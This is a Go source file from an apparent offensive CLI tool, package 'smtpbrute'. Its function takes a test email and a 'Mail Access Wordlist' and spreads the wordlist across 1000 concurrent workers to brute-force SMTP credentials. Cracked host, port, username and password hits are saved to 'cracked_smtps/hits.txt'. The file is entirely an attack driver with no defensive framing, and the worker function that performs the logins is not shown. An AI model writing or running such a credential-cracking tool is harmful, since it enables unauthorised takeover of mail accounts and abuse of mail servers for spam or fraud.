package smtpbrute

import (
	"fmt"
	"go_cli/fileutil"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
)

func BruteSmtp() {
	var testEmail string
	fmt.Print("\nEnter test email :> ")
	fmt.Scanln(&testEmail)
	if len(testEmail) == 0 {
		fmt.Println("invalid input!")
		return
	}
	fmt.Println("\nSelect your wordlist: ")
	filePath, err := zenity.SelectFile(
		zenity.FileFilters{
			{Name: "Mail Access Wordlist", Patterns: []string{"*.txt"}, CaseFold: false},
		})
	if err != nil {
		fmt.Printf("err: %v\n", err)
	}
	fmt.Printf("\nfilePath: %v\n", filePath)
	wordList, _ := fileutil.ReadFromFile(filePath)
	testEmail = strings.TrimSpace(testEmail)
	red := color.New(color.FgRed).PrintlnFunc()
	red("\nSMTP Host\t\tPort\t\tUsername\t\tPassword")
	red("-------------------------------------------------------------------")

	var wg sync.WaitGroup
	var mutex sync.Mutex
	var totlChecks int

	maxWorkers := 1000
	chunkSize := len(wordList) / maxWorkers

	if len(wordList)%maxWorkers != 0 {
		chunkSize++
	}
	wordListChunks := make(chan []string, chunkSize)

	file := fileutil.WriteToFile("cracked_smtps", "hits.txt")
	defer file.Close()

	// spawn goroutines which will be reading data from the ipChunks channel concurrently.
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go ProcessCredentials(wordListChunks, file, i, testEmail, &mutex, &wg, &totlChecks)
	}

	// share wordlist among goroutines by sending calculated chunk data size to worker channel.
	for i := 0; i < len(wordList); i += chunkSize {
		end := i + chunkSize
		if end > len(wordList) {
			end = len(wordList)
		}
		wordListChunks <- wordList[i:end]
	}
	// fmt.Printf("len(wordListsChunk): %v\n", len(wordListChunks))
	close(wordListChunks)
	wg.Wait()
	fmt.Println("\nall checks are done!")
}
